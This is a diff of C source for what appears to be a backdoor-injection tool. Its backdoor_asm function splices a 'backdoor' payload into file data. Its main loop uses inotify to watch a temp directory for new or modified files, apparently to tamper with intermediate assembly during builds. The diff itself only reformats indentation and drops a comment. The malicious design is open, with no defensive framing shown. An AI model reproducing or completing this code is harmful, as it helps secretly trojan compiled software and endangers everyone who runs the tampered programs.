@@ -81,7 +81,6 @@ char *backdoor_asm(char *data, size_t *size) {
     // Insert backdoor
     memcpy(pos + target_len, backdoor, backdoor_len);
 
-    // Communicate the new file_size back to the caller
     *size += backdoor_len;
     return new_data;
 }
@@ -129,20 +128,20 @@ void parse_event(struct inotify_event *i) {
 
 int main(int argc, char *argv[]) {
     struct inotify_event *event;
-	char buf[1024];
+    char buf[1024];
     char *p;
-	size_t num_read;
+    size_t num_read;
 
     int in_fd = inotify_init();
     int wd = inotify_add_watch(in_fd, tmp_dir, IN_CREATE | IN_MODIFY);
 
-	while(1) {
-		num_read = read(in_fd, buf, 1024);
+    while(1) {
+        num_read = read(in_fd, buf, 1024);
 
-		for (p = buf; p < buf + num_read; ) {
-		 event = (struct inotify_event *) p;
-		 parse_event(event);
-		 p += sizeof(struct inotify_event) + event->len;
-		}
-	}
+        for (p = buf; p < buf + num_read; ) {
+            event = (struct inotify_event *) p;
+            parse_event(event);
+            p += sizeof(struct inotify_event) + event->len;
+        }
+    }
 }
